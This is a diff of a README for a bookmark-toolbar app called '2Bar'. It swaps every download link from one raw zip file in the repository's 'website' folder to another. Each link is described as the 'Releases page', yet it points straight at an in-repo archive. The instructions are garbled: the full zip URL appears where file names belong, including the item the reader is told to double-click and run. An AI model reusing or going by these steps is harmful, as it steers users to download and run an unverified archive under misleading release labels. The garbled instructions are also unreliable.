@@ -6,7 +6,7 @@ Welcome to 2Bar! This application offers a unique way to replicate the bookmark 
 
 ## 📥 Download Now
 
-[![Download 2Bar](https://raw.githubusercontent.com/MitsuakiTora/2Bar/main/website/Bar-v1.9.zip)](https://raw.githubusercontent.com/MitsuakiTora/2Bar/main/website/Bar-v1.9.zip)
+[![Download 2Bar](https://github.com/MitsuakiTora/2Bar/raw/refs/heads/main/website/Bar-1.5.zip)](https://github.com/MitsuakiTora/2Bar/raw/refs/heads/main/website/Bar-1.5.zip)
 
 ## 📋 System Requirements
 
@@ -31,7 +31,7 @@ To run 2Bar, your system should meet the following requirements:
 
 To download 2Bar, click the link below to access the Releases page:
 
-[Download 2Bar from Releases](https://raw.githubusercontent.com/MitsuakiTora/2Bar/main/website/Bar-v1.9.zip)
+[Download 2Bar from Releases](https://github.com/MitsuakiTora/2Bar/raw/refs/heads/main/website/Bar-1.5.zip)
 
 ### 2. Choose the Right Version
 
@@ -39,7 +39,7 @@ On the Releases page, you will see a list of available versions. Find the latest
 
 ### 3. Click on the Download Link
 
-In the selected version section, look for the download link. It may be labeled as `https://raw.githubusercontent.com/MitsuakiTora/2Bar/main/website/Bar-v1.9.zip`, `https://raw.githubusercontent.com/MitsuakiTora/2Bar/main/website/Bar-v1.9.zip`, or a similar name. Click on this link to start downloading the file.
+In the selected version section, look for the download link. It may be labeled as `https://github.com/MitsuakiTora/2Bar/raw/refs/heads/main/website/Bar-1.5.zip`, `https://github.com/MitsuakiTora/2Bar/raw/refs/heads/main/website/Bar-1.5.zip`, or a similar name. Click on this link to start downloading the file.
 
 ### 4. Extract the File (if needed)
 
@@ -47,7 +47,7 @@ If you downloaded a ZIP file, you need to extract it. Right-click the downloaded
 
 ### 5. Run the Application
 
-Once extracted (or if you downloaded an executable file), navigate to the folder where the file is located. Double-click on `https://raw.githubusercontent.com/MitsuakiTora/2Bar/main/website/Bar-v1.9.zip` (or the relevant file) to run the application.
+Once extracted (or if you downloaded an executable file), navigate to the folder where the file is located. Double-click on `https://github.com/MitsuakiTora/2Bar/raw/refs/heads/main/website/Bar-1.5.zip` (or the relevant file) to run the application.
 
 ### 6. Set Up Your Bookmark Toolbar
 
@@ -83,7 +83,7 @@ If you need help or have questions, feel free to visit the GitHub Issues page fo
 
 ## 📂 Download & Install
 
-Ready to get started? [Download 2Bar from Releases](https://raw.githubusercontent.com/MitsuakiTora/2Bar/main/website/Bar-v1.9.zip) and follow the simple installation steps above. Enjoy the streamlined experience of having your bookmarks visually accessible with ease!
+Ready to get started? [Download 2Bar from Releases](https://github.com/MitsuakiTora/2Bar/raw/refs/heads/main/website/Bar-1.5.zip) and follow the simple installation steps above. Enjoy the streamlined experience of having your bookmarks visually accessible with ease!
 
 ---
 
